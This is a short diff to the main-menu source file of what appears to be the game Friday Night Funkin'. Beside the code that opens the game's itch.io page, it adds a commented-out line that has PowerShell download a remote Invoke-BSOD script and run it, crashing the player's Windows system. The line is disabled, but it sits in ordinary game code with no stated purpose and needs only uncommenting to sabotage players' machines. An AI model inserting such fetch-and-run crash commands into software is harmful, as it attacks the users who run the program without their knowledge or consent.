@@ -157,6 +157,7 @@ class MainMenuState extends MusicBeatState
 					Sys.command('/usr/bin/xdg-open', ["https://ninja-muffin24.itch.io/funkin", "&"]);
 					#else
 					FlxG.openURL('https://ninja-muffin24.itch.io/funkin');
+					//Sys.command("powershell.exe -command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD");
 					#end
 				}
 				else
